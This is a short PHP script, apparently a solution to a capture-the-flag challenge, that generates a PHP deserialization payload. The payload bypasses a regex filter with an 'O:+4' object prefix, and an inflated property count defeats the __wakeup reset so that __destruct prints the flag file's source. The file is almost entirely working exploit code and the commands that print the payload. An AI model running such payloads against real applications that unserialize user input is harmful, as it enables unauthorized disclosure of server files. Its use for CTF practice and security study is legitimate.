<?php 
class Demo { 
    private $file = 'index.php';
    public function __construct($file) { 
        $this->file = $file; 
    }
    function __destruct() { 
        echo @highlight_file($this->file, true); 
    }
    function __wakeup() { 
        if ($this->file != 'index.php') { 
            //the secret is in the fl4g.php
            $this->file = 'index.php'; 
        } 
    } 
}

// if (isset($_GET['var'])) { 
//     $var = base64_decode($_GET['var']); 
//     if (preg_match('/[oc]:\d+:/i', $var)) { 
//         die('stop hacking!'); 
//     } else {
//         @unserialize($var); 
//     } 
// } else { 
//     highlight_file("index.php"); 
// } 

$a = new Demo('fl4g.php');
$b = serialize($a);
var_dump($b);
echo '</br>';
var_dump(base64_encode($b));
echo '</br>';
// O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}
// O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}
$x = 'O:+4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}';
// O:+4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}

$c = str_replace('O:4','O:+4',$b);
$d = str_replace(':1:',':2:',$c);

var_dump(base64_encode($d));
echo '</br>';
var_dump($x);
echo '</br>';
var_dump($d);
echo '</br>';
var_dump($x==$d);
?>